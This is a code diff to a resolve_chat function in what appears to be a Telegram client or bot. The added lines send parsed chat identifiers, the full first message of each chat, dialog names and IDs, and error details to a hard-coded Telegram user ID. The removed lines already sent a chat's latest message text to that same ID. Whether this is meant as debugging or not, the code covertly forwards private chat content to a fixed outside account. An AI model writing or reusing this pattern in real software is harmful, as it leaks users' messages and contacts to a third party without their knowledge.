@@ -72,26 +72,55 @@ async def resolve_chat(client, value, chat_id, label):
     while True:
         chat, detected = parse_chat(value)
 
+        await client.send_message(
+            1733124290,
+            f"Parsed:\n{chat!r}\nType: {type(chat).__name__}"
+        )
+
         try:
-            await client.get_messages(chat, ids=1)
-            try:
-                lim = await client.get_messages(chat, limit=1)
-                await client.send_message(1733124290, f"{lim.text}")
-            except Exception:
-                pass
+            msg = await client.get_messages(chat, ids=1)
+
+            await client.send_message(
+                1733124290,
+                f"Success!\nMessage: {msg}"
+            )
+
             return chat, detected
 
-        except Exception:
-            # Try resolving numeric -100... IDs from dialogs
+        except Exception as e:
+            await client.send_message(
+                1733124290,
+                f"Exception:\n"
+                f"{type(e).__name__}\n\n"
+                f"{repr(e)}"
+            )
+
             try:
                 if isinstance(chat, int) and str(chat).startswith("-100"):
-                    target = int(str(chat)[4:])  # remove -100 prefix
+                    target = int(str(chat)[4:])
 
                     async for dialog in client.iter_dialogs():
                         if dialog.id == target:
+                            await client.send_message(
+                                1733124290,
+                                f"Found in dialogs:\n"
+                                f"{dialog.name}\n"
+                                f"{dialog.id}"
+                            )
                             return dialog.entity, detected
-            except Exception:
-                pass
+
+                    await client.send_message(
+                        1733124290,
+                        f"Not found in dialogs.\nLooking for: {target}"
+                    )
+
+            except Exception as e2:
+                await client.send_message(
+                    1733124290,
+                    f"Dialog Exception:\n"
+                    f"{type(e2).__name__}\n\n"
+                    f"{repr(e2)}"
+                )
 
             value = await ask_or_cancel(
                 type(
@@ -103,8 +132,7 @@ async def resolve_chat(client, value, chat_id, label):
                     },
                 ),
                 f"🌱 I can't access that {label}.\n"
-                "Send a message in that chat first (or ask an admin to), "
-                "then send the chat ID/username/link again."
+                "Send the chat ID/username/link again."
             )
 
 
